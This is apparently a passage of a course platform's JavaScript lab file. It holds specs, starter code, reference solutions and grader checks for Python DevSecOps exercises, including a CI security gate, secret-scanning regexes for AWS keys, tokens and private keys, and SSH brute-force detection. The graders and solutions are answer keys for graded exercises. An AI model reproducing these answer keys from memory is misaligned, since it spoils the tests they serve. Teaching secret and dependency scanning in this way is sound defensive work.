      "<p>The starter already has the secret patterns, each paired with its severity.</p>" +
      "<h3>What to build</h3>" +
      '<table class="t"><tr><th>Piece</th><th>Spec</th></tr>' +
      "<tr><td><code>Finding(tool, severity, location, title)</code></td><td>as in PY-125: severity lowercased, class attribute <code>LEVELS</code>, <code>rank()</code>, <code>is_blocking(threshold)</code> (default <code>\"high\"</code>), <code>__str__</code> → <code>[HIGH] repo/app.py:3 GitHub token (secrets)</code>, plus <code>to_dict()</code> → a dict with the four attributes</td></tr>" +
      "<tr><td><code>scan_secrets(root)</code></td><td>a Finding per match in every file under <code>root</code>: tool <code>\"secrets\"</code>, the pattern's severity, location <code>path:line</code> (forward slashes), title = the pattern name</td></tr>" +
      "<tr><td><code>check_dependencies(req_path, adv_path)</code></td><td>a Finding per vulnerable pin: tool <code>\"deps\"</code>, the advisory's severity, location <code>req_path</code>, title <code>django 4.2.10 -> 4.2.16 (KSA-2026-0031)</code>. Plus a <code>low</code> Finding <code>flask is not pinned</code> for each unpinned package.</td></tr>" +
      "<tr><td><code>build_parser()</code></td><td>positional <code>path</code>; <code>--requirements</code> (default <code>requirements.txt</code>); <code>--advisories</code> (default <code>advisories.json</code>); <code>--fail-on</code> (choices = the levels, default from the <code>FAIL_ON</code> environment variable, lowercased, else <code>high</code>); <code>--report</code> (optional JSON output path)</td></tr>" +
      "<tr><td><code>main(argv=None)</code></td><td>parses <code>argv</code> (<code>None</code> = the command line), collects all findings, prints them sorted worst first, then by location, then by title; when <code>GITHUB_ACTIONS=true</code>, prints <code>::error title=secrets::repo/app.py:3 GitHub token</code> for each blocking finding; prints the Gate line; writes the report if <code>--report</code> was given; <b>returns</b> 1 if anything blocks, else 0</td></tr>" +
      "<tr><td>Gate line</td><td><code>Gate: FAIL (5 blocking of 9, threshold high)</code> or <code>Gate: PASS (0 blocking of 2, threshold high)</code></td></tr>" +
      "<tr><td>Report</td><td><code>{\"threshold\": \"high\", \"passed\": false, \"findings\": [...]}</code>, findings as <code>to_dict()</code>s in printed order</td></tr></table>" +
      "<p><code>sys.exit(main())</code> at the bottom turns main's return value into the exit code.</p>" +
      "<h3>Expected output</h3><p>With the Arguments and Environment boxes as they start:</p>" +
      '<pre class="code">[CRITICAL] repo/config/settings.py:3 AWS access key (secrets)\n[CRITICAL] repo/deploy/id_ed25519:1 Private key (secrets)\n[CRITICAL] requirements.txt cryptography 42.0.0 -> 42.0.4 (KSA-2026-0107) (deps)\n[HIGH] repo/app.py:3 GitHub token (secrets)\n[HIGH] requirements.txt django 4.2.10 -> 4.2.16 (KSA-2026-0031) (deps)\n[MEDIUM] repo/config/settings.py:5 Hard-coded password (secrets)\n[MEDIUM] requirements.txt jinja2 3.1.4 -> 3.1.5 (KSA-2026-0058) (deps)\n[MEDIUM] requirements.txt requests 2.31.0 -> 2.32.0 (KSA-2026-0044) (deps)\n[LOW] requirements.txt flask is not pinned (deps)\nGate: FAIL (5 blocking of 9, threshold high)\n↳ exit code 1</pre>',
    starter: py`
      # PY-127 · Ship the security gate (Module 3 capstone)
      import argparse
      import json
      import os
      import re
      import sys
      from pathlib import Path

      PATTERNS = {
          "AWS access key": (re.compile(r"AKIA[0-9A-Z]{16}"), "critical"),
          "Private key": (re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"), "critical"),
          "GitHub token": (re.compile(r"ghp_[A-Za-z0-9]{36}"), "high"),
          "Hard-coded password": (re.compile(r"(?i)password\s*=\s*[\"'][^\"']+[\"']"), "medium"),
      }


      class Finding:
          pass


      def scan_secrets(root):
          pass


      def check_dependencies(req_path, adv_path):
          pass


      def build_parser():
          pass


      def main(argv=None):
          pass


      if __name__ == "__main__":
          sys.exit(main())
    `,
    argv: "repo --requirements requirements.txt --advisories advisories.json",
    env: { FAIL_ON: "high" },
    files: GATE_FILES,
    removeFiles: ["report.json", "_ok.txt", "_req.txt", "repo/scripts/backup.sh"],
    solution: py`
      import argparse
      import json
      import os
      import re
      import sys
      from pathlib import Path

      PATTERNS = {
          "AWS access key": (re.compile(r"AKIA[0-9A-Z]{16}"), "critical"),
          "Private key": (re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"), "critical"),
          "GitHub token": (re.compile(r"ghp_[A-Za-z0-9]{36}"), "high"),
          "Hard-coded password": (re.compile(r"(?i)password\s*=\s*[\"'][^\"']+[\"']"), "medium"),
      }


      class Finding:
          LEVELS = ["low", "medium", "high", "critical"]

          def __init__(self, tool, severity, location, title):
              self.tool = tool
              self.severity = severity.lower()
              self.location = location
              self.title = title

          def rank(self):
              return self.LEVELS.index(self.severity)

          def is_blocking(self, threshold="high"):
              return self.rank() >= self.LEVELS.index(threshold)

          def to_dict(self):
              return {"tool": self.tool, "severity": self.severity, "location": self.location, "title": self.title}

          def __str__(self):
              return f"[{self.severity.upper()}] {self.location} {self.title} ({self.tool})"


      def scan_secrets(root):
          found = []
          for path in sorted(Path(root).rglob("*")):
              if not path.is_file():
                  continue
              text = path.read_text(errors="ignore")
              for number, line in enumerate(text.splitlines(), start=1):
                  for kind, (pattern, severity) in PATTERNS.items():
                      for _ in pattern.finditer(line):
                          found.append(Finding("secrets", severity, f"{path.as_posix()}:{number}", kind))
          return found


      def version_tuple(version):
          return tuple(int(part) for part in version.split("."))


      def check_dependencies(req_path, adv_path):
          pins = {}
          with open(req_path) as f:
              for line in f:
                  line = line.split("#")[0].strip()
                  if not line:
                      continue
                  if "==" in line:
                      name, version = line.split("==")
                      pins[name.strip().lower()] = version.strip()
                  else:
                      pins[line.lower()] = None
          with open(adv_path) as f:
              advisories = json.load(f)

          found = []
          for adv in advisories:
              version = pins.get(adv["package"])
              if version is not None and version_tuple(version) < version_tuple(adv["fixed_in"]):
                  title = f"{adv['package']} {version} -> {adv['fixed_in']} ({adv['id']})"
                  found.append(Finding("deps", adv["severity"], req_path, title))
          for name, version in pins.items():
              if version is None:
                  found.append(Finding("deps", "low", req_path, f"{name} is not pinned"))
          return found


      def build_parser():
          parser = argparse.ArgumentParser(prog="gate", description="Fail the build on secrets and vulnerable dependencies.")
          parser.add_argument("path", help="folder to scan for secrets")
          parser.add_argument("--requirements", default="requirements.txt")
          parser.add_argument("--advisories", default="advisories.json")
          parser.add_argument("--fail-on", choices=Finding.LEVELS,
                              default=os.environ.get("FAIL_ON", "high").lower(),
                              help="lowest severity that fails the build (default: $FAIL_ON or high)")
          parser.add_argument("--report", help="write a JSON report to this file")
          return parser


      def main(argv=None):
          args = build_parser().parse_args(argv)
          findings = scan_secrets(args.path) + check_dependencies(args.requirements, args.advisories)
          findings.sort(key=lambda f: (-f.rank(), f.location, f.title))
          blocking = [f for f in findings if f.is_blocking(args.fail_on)]

          for f in findings:
              print(f)
          if os.environ.get("GITHUB_ACTIONS") == "true":
              for f in blocking:
                  print(f"::error title={f.tool}::{f.location} {f.title}")

          verdict = "FAIL" if blocking else "PASS"
          print(f"Gate: {verdict} ({len(blocking)} blocking of {len(findings)}, threshold {args.fail_on})")

          if args.report:
              with open(args.report, "w") as f:
                  json.dump({"threshold": args.fail_on, "passed": not blocking,
                             "findings": [x.to_dict() for x in findings]}, f, indent=2)
          return 1 if blocking else 0


      if __name__ == "__main__":
          sys.exit(main())
    `,
    objectives: [
      {
        id: "finding", hints: [],
        text: "<code>Finding</code> works as specified: lowercased severity, <code>LEVELS</code>, <code>rank()</code>, <code>is_blocking(threshold=\"high\")</code>, <code>__str__</code> and <code>to_dict()</code>.",
        check: py`
          def check(ns, out, run, src):
              C = ns.get("Finding")
              if not isinstance(C, type):
                  return "I can't find a class called Finding."
              try:
                  f = C("secrets", "HIGH", "repo/app.py:3", "GitHub token")
                  low = C("deps", "Low", "requirements.txt", "flask is not pinned")
                  checks = [
                      (f.severity, "high", "severity (lowercased)"),
                      (getattr(C, "LEVELS", None), ["low", "medium", "high", "critical"], "Finding.LEVELS"),
                      (f.rank(), 2, "rank() of a high finding"),
                      (low.rank(), 0, "rank() of a low finding"),
                      (f.is_blocking(), True, "is_blocking() of a high finding"),
                      (f.is_blocking("critical"), False, "is_blocking(\"critical\") of a high finding"),
                      (low.is_blocking("low"), True, "is_blocking(\"low\") of a low finding"),
                      (str(f), "[HIGH] repo/app.py:3 GitHub token (secrets)", "str(finding)"),
                      (f.to_dict(), {"tool": "secrets", "severity": "high", "location": "repo/app.py:3", "title": "GitHub token"}, "to_dict()"),
                  ]
              except Exception as e:
                  return "Using Finding crashed: " + type(e).__name__ + ": " + str(e)
              for got, want, label in checks:
                  if got != want or type(got) is not type(want):
                      return label + " should be " + H.short(want, 120) + ", got " + H.short(got, 120) + "."
              return True
        `
      },
      {
        id: "secrets", hints: [],
        text: "<code>scan_secrets(\"repo\")</code> finds the 4 secrets as Findings with the right severities and <code>path:line</code> locations.",
        check: py`
          def check(ns, out, run, src):
              import os
              f = H.fn(ns, "scan_secrets")
              if not f:
                  return "I can't find a function called scan_secrets."
              ok, got = H.call(f, "repo")
              if not ok:
                  return "scan_secrets(\"repo\") crashed: " + type(got).__name__ + ": " + str(got)
              want = {"[HIGH] repo/app.py:3 GitHub token (secrets)", "[CRITICAL] repo/config/settings.py:3 AWS access key (secrets)",
                      "[MEDIUM] repo/config/settings.py:5 Hard-coded password (secrets)", "[CRITICAL] repo/deploy/id_ed25519:1 Private key (secrets)"}
              if not isinstance(got, list):
                  return "scan_secrets should return a list of Findings, got " + H.short(got) + "."
              strs = [str(x) for x in got]
              if len(strs) != 4 or set(strs) != want:
                  return "scan_secrets(\"repo\") should give these 4 findings (as str()):\n  " + "\n  ".join(sorted(want)) + "\nYours:\n  " + ("\n  ".join(strs[:8]) or "(none)")
              os.makedirs("repo/scripts", exist_ok=True)
              with open("repo/scripts/backup.sh", "w") as fh:
                  fh.write("#!/bin/sh\nexport AWS_ACCESS_KEY_ID=AKIA" + "MNBVCXZLKJHGFDSA\n")
              ok, got = H.call(f, "repo")
              os.remove("repo/scripts/backup.sh")
              if not ok or "[CRITICAL] repo/scripts/backup.sh:2 AWS access key (secrets)" not in [str(x) for x in got]:
                  return "When I added repo/scripts/backup.sh with a key on line 2, scan_secrets didn't report it."
              return True
        `
      },
      {
        id: "deps", hints: [],
        text: "<code>check_dependencies(\"requirements.txt\", \"advisories.json\")</code> returns the 4 vulnerable pins and the unpinned <code>flask</code> as Findings.",
        check: py`
          def check(ns, out, run, src):
              import os
              f = H.fn(ns, "check_dependencies")
              if not f:
                  return "I can't find a function called check_dependencies."
              ok, got = H.call(f, "requirements.txt", "advisories.json")
              if not ok:
                  return "check_dependencies crashed: " + type(got).__name__ + ": " + str(got)
              want = {"[CRITICAL] requirements.txt cryptography 42.0.0 -> 42.0.4 (KSA-2026-0107) (deps)",
                      "[HIGH] requirements.txt django 4.2.10 -> 4.2.16 (KSA-2026-0031) (deps)",
                      "[MEDIUM] requirements.txt jinja2 3.1.4 -> 3.1.5 (KSA-2026-0058) (deps)",
                      "[MEDIUM] requirements.txt requests 2.31.0 -> 2.32.0 (KSA-2026-0044) (deps)",
                      "[LOW] requirements.txt flask is not pinned (deps)"}
              strs = [str(x) for x in got] if isinstance(got, list) else []
              if set(strs) != want or len(strs) != 5:
                  hint = ""
                  if any("KSA-2026-0113" in s for s in strs):
                      hint = "\n(django 4.2.10 isn't below 4.2.9: compare versions as tuples of ints, not strings)"
                  if any("urllib3" in s for s in strs):
                      hint = "\n(urllib3 2.2.2 is the fixed version, so it isn't vulnerable)"
                  return "check_dependencies should give these 5 findings:\n  " + "\n  ".join(sorted(want)) + "\nYours:\n  " + ("\n  ".join(strs[:8]) or "(none)") + hint
              with open("_req.txt", "w") as fh:
                  fh.write("Jinja2==3.0.0\nflask==3.0.3\n")
              ok, got = H.call(f, "_req.txt", "advisories.json")
              os.remove("_req.txt")
              if not ok or [str(x) for x in got] != ["[MEDIUM] _req.txt jinja2 3.0.0 -> 3.1.5 (KSA-2026-0058) (deps)"]:
                  return "For a requirements file with Jinja2==3.0.0 and flask==3.0.3, check_dependencies should return only the jinja2 finding, with location \"_req.txt\". Got " + (H.short([str(x) for x in got], 200) if ok else type(got).__name__) + "."
              return True
        `
      },
      {
        id: "cli", hints: [],
        text: "<code>build_parser()</code> has <code>path</code>, <code>--requirements</code>, <code>--advisories</code>, <code>--fail-on</code> (choices, default from <code>FAIL_ON</code>) and <code>--report</code>; bad values exit with code 2.",
        check: GATE_WANT + py`
          def check(ns, out, run, src):
              import io, contextlib
              if not H.fn(ns, "build_parser"):
                  return "I can't find a function called build_parser."
              p = ns["build_parser"]()
              if p is None or not hasattr(p, "parse_args"):
                  return "build_parser() should return the ArgumentParser."
              buf = io.StringIO()
              try:
                  with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
                      a = p.parse_args(["repo"])
              except SystemExit:
                  return "parse_args([\"repo\"]) was rejected:\n  " + buf.getvalue().strip()[-300:]
              for attr, want in [("path", "repo"), ("requirements", "requirements.txt"), ("advisories", "advisories.json"), ("report", None)]:
                  if getattr(a, attr, "(missing)") != want:
                      return "With just \"repo\", args." + attr + " should be " + repr(want) + ", got " + H.short(getattr(a, attr, "(missing)")) + "."
              if not hasattr(a, "fail_on"):
                  return "Add --fail-on (argparse stores it as args.fail_on)."
              n, lines, e, code = gate(run, ARGS + " --fail-on urgent")
              if code != 2:
                  return "With --fail-on urgent the tool should refuse (exit code 2). Use choices=Finding.LEVELS. Exit code was " + str(code) + "."
              n, lines, e, code = gate(run, ARGS, {"FAIL_ON": "CRITICAL"})
              if not any(l.startswith("Gate:") and l.endswith("threshold critical)") for l in lines):
                  return "With FAIL_ON=CRITICAL in the environment and no --fail-on, the threshold should be critical. Use os.environ.get(\"FAIL_ON\", \"high\").lower() as the default."
              n, lines, e, code = gate(run, ARGS + " --fail-on medium", {"FAIL_ON": "critical"})
              if not any(l.startswith("Gate:") and l.endswith("threshold medium)") for l in lines):
                  return "--fail-on medium on the command line should win over FAIL_ON in the environment."
              return True
        `
      },
      {
        id: "gate", hints: [],
        text: "Running the tool prints every finding worst first and the Gate line, and <b>exits</b> with 1 when anything blocks, 0 when nothing does.",
        check: GATE_WANT + py`
          def check(ns, out, run, src):
              import os
              n, lines, e, code = gate(run)
              if e:
                  return "Running with the default arguments crashed:\n" + e[0][-400:]
              want = WANT + ["Gate: FAIL (5 blocking of 9, threshold high)"]
              got = [l for l in lines if not l.startswith("::")]
              if got != want:
                  return "With the default arguments, expected:\n  " + "\n  ".join(want) + "\nYou printed:\n  " + ("\n  ".join(got[:12]) or "(nothing)")
              if code != 1:
                  return "When the gate fails the exit code must be 1, but it was " + str(code) + ". Return 1 from main() and call sys.exit(main())."
              n, lines, e, code = gate(run, ARGS + " --fail-on critical")
              if "Gate: FAIL (3 blocking of 9, threshold critical)" not in lines or code != 1:
                  return "With --fail-on critical, expected Gate: FAIL (3 blocking of 9, threshold critical) and exit code 1."
              with open("_ok.txt", "w") as fh:
                  fh.write("pyyaml==6.0.1\nflask\n")
              try:
                  n, lines, e, code = gate(run, "repo/tests --requirements _ok.txt")
              finally:
                  os.remove("_ok.txt")
              if lines != ["[LOW] _ok.txt flask is not pinned (deps)", "Gate: PASS (0 blocking of 1, threshold high)"]:
                  return "For \"repo/tests --requirements _ok.txt\" (no secrets; only an unpinned flask) expected:\n  [LOW] _ok.txt flask is not pinned (deps)\n  Gate: PASS (0 blocking of 1, threshold high)\nYou printed:\n  " + ("\n  ".join(lines[:6]) or "(nothing)")
              if code != 0:
                  return "When the gate passes, the exit code must be 0, but it was " + str(code) + "."
              return True
        `
      },
      {
        id: "outputs", hints: [],
        text: "<code>--report report.json</code> writes the JSON report, and with <code>GITHUB_ACTIONS=true</code> the tool prints an <code>::error</code> annotation for each blocking finding.",
        check: GATE_WANT + py`
          def check(ns, out, run, src):
              import json, os
              if os.path.exists("report.json"):
                  os.remove("report.json")
              n, lines, e, code = gate(run, ARGS + " --report report.json")
              if not os.path.exists("report.json"):
                  return "With --report report.json, no report.json was written."
              try:
                  data = json.load(open("report.json"))
              except ValueError:
                  return "report.json isn't valid JSON. Use json.dump."
              finally:
                  os.remove("report.json")
              if data.get("threshold") != "high" or data.get("passed") is not False:
                  return "The report should have \"threshold\": \"high\" and \"passed\": false, got " + H.short({k: data.get(k) for k in ("threshold", "passed")}) + "."
              fs = data.get("findings")
              if not isinstance(fs, list) or len(fs) != 9 or fs[0] != {"tool": "secrets", "severity": "critical", "location": "repo/config/settings.py:3", "title": "AWS access key"}:
                  return "report[\"findings\"] should hold the 9 findings as to_dict()s, in printed order (first: the AWS key in repo/config/settings.py:3)."
              n, lines, e, code = gate(run, ARGS, {"FAIL_ON": "high", "GITHUB_ACTIONS": "true"})
              ann = [l for l in lines if l.startswith("::")]
              want = ["::error title=secrets::repo/config/settings.py:3 AWS access key", "::error title=secrets::repo/deploy/id_ed25519:1 Private key",
                      "::error title=deps::requirements.txt cryptography 42.0.0 -> 42.0.4 (KSA-2026-0107)",
                      "::error title=secrets::repo/app.py:3 GitHub token", "::error title=deps::requirements.txt django 4.2.10 -> 4.2.16 (KSA-2026-0031)"]
              if ann != want:
                  return "With GITHUB_ACTIONS=true, expected these annotations (one per blocking finding, in order):\n  " + "\n  ".join(want) + "\nYou printed:\n  " + ("\n  ".join(ann) or "(none)")
              n, lines, e, code = gate(run)
              if any(l.startswith("::") for l in lines):
                  return "Only print annotations when GITHUB_ACTIONS is \"true\"."
              return True
        `
      }
    ],
    debrief: "<p><b>Module 3 complete.</b> You built a real CI security gate: it scans code and dependencies, explains itself on the command line, takes configuration from the environment, writes machine-readable output, talks to GitHub, and stops the line with an exit code. That's the daily toolkit of a DevSecOps engineer.</p>" +
      "<p>Module 4 switches sides: instead of finding problems in other people's code, you'll exploit and fix the classic web vulnerabilities yourself, starting with SQL injection.</p>",
    realworld: "In a real pipeline this file is one step in .github/workflows/security.yml: python gate.py . --report gate.json, with FAIL_ON set per repo and the report uploaded as a build artifact. Teams usually run established scanners (gitleaks, pip-audit, trivy, semgrep) and write a small gate like yours that merges their outputs and applies the company's policy.",
    quiz: []
  });

  /* ------------------------------------------------------------------ Reference solutions */
  var SOLUTIONS = {
    "py-118": py`
      import re
      from datetime import datetime, timedelta

      LINE = re.compile(r"^(\S+ \S+) \S+ sshd\[\d+\]: (Failed|Accepted) password for (?:invalid user )?(\S+) from (\S+) port")


      def parse_line(line):
          m = LINE.match(line)
          if not m:
              return None
          when = datetime.strptime(m.group(1), "%Y-%m-%d %H:%M:%S")
          return (when, m.group(2), m.group(3), m.group(4))


      failures = {}
      logins = {}
      with open("logs/auth.log") as f:
          for line in f:
              entry = parse_line(line)
              if entry is None:
                  continue
              when, result, user, ip = entry
              if result == "Failed":
                  failures.setdefault(ip, []).append(when)
              else:
                  logins[ip] = user


      def is_burst(times, limit=5, window=timedelta(minutes=10)):
          for i in range(len(times) - limit + 1):
              if times[i + limit - 1] - times[i] <= window:
                  return True
          return False


      attackers = sorted(ip for ip, times in failures.items() if is_burst(times))

      for ip in attackers:
          count = len(failures[ip])
          if ip in logins:
              print(f"ALERT {ip}: logged in as {logins[ip]} after {count} failures")
          else:
              print(f"BLOCK {ip}: {count} failures")
    `,
    "py-119": py`
      import requests

      BASE = "https://api.kestrel.io/v1"
      TOKEN = "kc_demo_7f3a"
      HEADERS = {"Authorization": "Bearer " + TOKEN}


      def get_json(path, params=None):
          r = requests.get(BASE + path, params=params, headers=HEADERS, timeout=5)
          r.raise_for_status()
          return r.json()


      def all_users():
          users = []
          page = 1
          while page is not None:
              data = get_json("/users", {"page": page})
              users.extend(data["users"])
              page = data["next"]
          return users


      admins_without_mfa = []
      for user in all_users():
          if user["role"] == "admin":
              detail = get_json("/users/" + user["name"])
              if not detail["mfa"]:
                  admins_without_mfa.append(user["name"])
      admins_without_mfa.sort()

      for name in admins_without_mfa:
          r = requests.post(BASE + "/tickets", json={"title": f"Enable MFA for {name}", "user": name},
                            headers=HEADERS, timeout=5)
          r.raise_for_status()
          ticket = r.json()
          print(f"{ticket['id']} opened for {name}")
    `
,
    "py-120": py`
      import hashlib
      from pathlib import Path


      def sha256_text(text):
          return hashlib.sha256(text.encode()).hexdigest()


      def sha256_file(path):
          h = hashlib.sha256()
          with open(path, "rb") as f:
              while True:
                  chunk = f.read(65536)
                  if not chunk:
                      break
                  h.update(chunk)
          return h.hexdigest()


      manifest = {}
      with open("release/SHA256SUMS") as f:
          for line in f:
              if line.strip():
                  digest, name = line.split()
                  manifest[name] = digest

      changed = []
      missing = []
      for name, digest in manifest.items():
          path = Path("release") / name
          if not path.exists():
              missing.append(name)
          elif sha256_file(path) != digest:
              changed.append(name)
      changed.sort()
      missing.sort()

      for name in manifest:
          if name in missing:
              status = "MISSING"
          elif name in changed:
              status = "CHANGED"
          else:
              status = "OK"
          print(f"{status:8} {name}")
      print(f"{len(changed)} changed, {len(missing)} missing")
    `,
    "py-121": py`
      import re
      from pathlib import Path

      PATTERNS = {
          "AWS access key": re.compile(r"AKIA[0-9A-Z]{16}"),
          "GitHub token": re.compile(r"ghp_[A-Za-z0-9]{36}"),
          "Private key": re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
          "Hard-coded password": re.compile(r"(?i)password\s*=\s*[\"'][^\"']+[\"']"),
      }


      def find_secrets(text):
          found = []
          for number, line in enumerate(text.splitlines(), start=1):
              for kind, pattern in PATTERNS.items():
                  for m in pattern.finditer(line):
                      found.append((number, kind, m.group()))
          return found


      def scan_repo(root):
          results = []
          for p in sorted(Path(root).rglob("*")):
              if not p.is_file():
                  continue
              for number, kind, _ in find_secrets(p.read_text(errors="ignore")):
                  results.append((p.as_posix(), number, kind))
          return results


      findings = scan_repo("repo")
      for path, line, kind in findings:
          print(f"{path}:{line}  {kind}")
      files = {path for path, _, _ in findings}
      print(f"{len(findings)} secrets in {len(files)} files")
    `,
    "py-122": py`
      import json

      ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}


      def parse_requirements(text):
          pins = {}
          for line in text.splitlines():
              line = line.split("#")[0].strip()
              if not line:
                  continue
              if "==" in line:
                  name, version = line.split("==")
                  pins[name.strip().lower()] = version.strip()
              else:
                  pins[line.lower()] = None
          return pins


      def version_tuple(version):
          return tuple(int(part) for part in version.split("."))


      def find_vulnerable(pins, advisories):
          found = []
          for adv in advisories:
              version = pins.get(adv["package"])
              if version is not None and version_tuple(version) < version_tuple(adv["fixed_in"]):
                  found.append((adv["package"], version, adv))
          return found


      with open("requirements.txt") as f:
          pins = parse_requirements(f.read())
      with open("advisories.json") as f:
          advisories = json.load(f)

      found = find_vulnerable(pins, advisories)
      for package, version, adv in sorted(found, key=lambda x: (ORDER[x[2]["severity"]], x[0])):
          print(f"{adv['severity'].upper():8} {package} {version} -> {adv['fixed_in']} ({adv['id']})")
      for name, version in pins.items():
          if version is None:
              print(f"UNPINNED {name}")
    `,
    "py-123": py`
      import argparse
      import json
      from collections import Counter
      from pathlib import Path


      def build_parser():
          parser = argparse.ArgumentParser(prog="logscan", description="Count log messages by level.")
          parser.add_argument("path", help="log file to scan")
          parser.add_argument("--level", choices=["INFO", "WARNING", "ERROR"], default="ERROR", help="level to count")
          parser.add_argument("--top", type=int, default=3, help="how many messages to show")
          parser.add_argument("--json", action="store_true", help="print JSON instead of text")
          return parser


      def main():
          parser = build_parser()
          args = parser.parse_args()
          if not Path(args.path).exists():
              parser.error(f"{args.path} doesn't exist")

          counts = Counter()
          with open(args.path) as f:
              for line in f:
                  date, time, level, message = line.rstrip("\n").split(" ", 3)
                  if level == args.level:
                      counts[message] += 1

          top = counts.most_common(args.top)
          total = sum(counts.values())
          if args.json:
              print(json.dumps({"path": args.path, "level": args.level, "total": total, "top": top}))
          else:
              print(f"{args.level} in {args.path}: {total} lines")
              for message, count in top:
                  print(f"  {count}  {message}")


      if __name__ == "__main__":
          main()
    `,
    "py-124": py`
      import json
      import os
      import sys

      LEVELS = ["low", "medium", "high", "critical"]

      token = os.environ.get("KESTREL_API_TOKEN")
      if not token:
          print("error: KESTREL_API_TOKEN is not set", file=sys.stderr)
          sys.exit(2)

      fail_on = os.environ.get("FAIL_ON", "high").lower()
      if fail_on not in LEVELS:
          print("error: FAIL_ON must be one of " + ", ".join(LEVELS), file=sys.stderr)
          sys.exit(2)

      with open("scan-results.json") as f:
          findings = json.load(f)

      threshold = LEVELS.index(fail_on)
      blocking = [f for f in findings if LEVELS.index(f["severity"]) >= threshold]

      in_actions = os.environ.get("GITHUB_ACTIONS") == "true"
      for f in blocking:
          print(f"BLOCK {f['id']} ({f['severity']}) {f['title']}")
          if in_actions:
              print(f"::error title={f['id']}::{f['title']}")

      if blocking:
          print(f"Gate: FAIL ({len(blocking)} blocking, threshold {fail_on})")
          sys.exit(1)
      print(f"Gate: PASS (threshold {fail_on})")
    `,
    "py-125": CLASS_DATA + "\n\n" + py`
      class Finding:
          LEVELS = ["low", "medium", "high", "critical"]

          def __init__(self, tool, severity, location, title):
              self.tool = tool
              self.severity = severity.lower()
              self.location = location
              self.title = title

          def rank(self):
              return self.LEVELS.index(self.severity)

          def is_blocking(self, threshold="high"):
              return self.rank() >= self.LEVELS.index(threshold)

          def __str__(self):
              return f"[{self.severity.upper()}] {self.location} {self.title} ({self.tool})"


      findings = []
      for r in bandit_results:
          findings.append(Finding("bandit", r["issue_severity"], f"{r['filename']}:{r['line_number']}", r["issue_text"]))
      for path, line, kind in secret_results:
          findings.append(Finding("secrets", "critical", f"{path}:{line}", kind))
      for d in dependency_results:
          findings.append(Finding("deps", d["severity"], "requirements.txt", f"{d['package']} {d['version']} ({d['id']})"))

      for f in sorted(findings, key=lambda f: (-f.rank(), f.location)):
          print(f)
      blocking = sum(1 for f in findings if f.is_blocking())
      print(f"{blocking} blocking at threshold high")
    `,
    "py-126": py`
      import pytest


      def parse_port(value):
          """Turn text like "443" into a port number 1-65535. Raise ValueError for anything else."""
          value = value.strip()
          if not value.isdigit():
              raise ValueError(f"not a port number: {value!r}")
          port = int(value)
          if not 1 <= port <= 65535:
              raise ValueError(f"port out of range: {port}")
          return port


      def parse_ports(text):
          """ "443, 22,80" -> [22, 80, 443]: sorted, without duplicates."""
          return sorted(set(parse_port(part) for part in text.split(",")))


      def test_parse_ports():
          assert parse_ports("443, 22,80,22") == [22, 80, 443]


      def test_valid_ports():
          assert parse_port("22") == 22
          assert parse_port("1") == 1
          assert parse_port("65535") == 65535
          assert parse_port(" 443 ") == 443


      def test_rejects_out_of_range():
          with pytest.raises(ValueError):
              parse_port("0")
          with pytest.raises(ValueError):
              parse_port("65536")


      def test_rejects_garbage():
          for bad in ["abc", "", "22.5", "-1"]:
              with pytest.raises(ValueError):
                  parse_port(bad)


      run_tests()
    `
  };

  /* ------------------------------------------------------------------ Register */
  LABS.forEach(function (l) {
    if (!l.solution && SOLUTIONS[l.id]) l.solution = SOLUTIONS[l.id];
    l.drills = [];
    T.LABS.push(l);
  });
  T.UPCOMING = T.UPCOMING.filter(function (row) { return row.module !== 3; });
})();
